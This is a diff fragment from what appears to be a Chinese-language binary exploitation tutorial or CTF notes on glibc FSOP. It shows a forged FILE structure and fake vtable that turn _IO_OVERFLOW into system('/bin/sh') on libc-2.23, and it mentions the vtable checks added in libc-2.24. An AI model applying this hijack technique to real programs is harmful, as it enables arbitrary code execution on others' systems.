@@ -168,3 +168,33 @@ int _IO_flush_all_lockp (int do_lock)
 fp->_mode = 0
 fp->_IO_write_ptr > fp->_IO_write_base
 ```
+就会调用`_IO_OVERFLOW()`函数，而这里的`_IO_OVERFLOW`就是**文件流对象虚表的第四项**指向的内容`_IO_new_file_overflow`，因此在`libc-2.23`版本下可如下构造，进行`FSOP`：
+```c
+._chain => chunk_addr
+chunk_addr
+{
+  file = {
+    _flags = "/bin/sh\x00", //对应此结构体首地址(fp)
+    _IO_read_ptr = 0x0,
+    _IO_read_end = 0x0,
+    _IO_read_base = 0x0,
+    _IO_write_base = 0x0,
+    _IO_write_ptr = 0x1,
+      ...
+      _mode = 0x0, //一般不用特意设置
+      _unused2 = '\000' <repeats 19 times>
+  },
+  vtable = heap_addr
+}
+heap_addr
+{
+  __dummy = 0x0,
+  __dummy2 = 0x0,
+  __finish = 0x0,
+  __overflow = system_addr,
+    ...
+}
+```
+因此这样构造，通过`_IO_OVERFLOW (fp)`，我们就实现了`system("/bin/sh\x00")`。
+
+而`libc-2.24`加入了对虚表的检查`IO_validate_vtable()`与`IO_vtable_check()`，若无法通过检查，则会报错：`Fatal error: glibc detected an invalid stdio handle`。
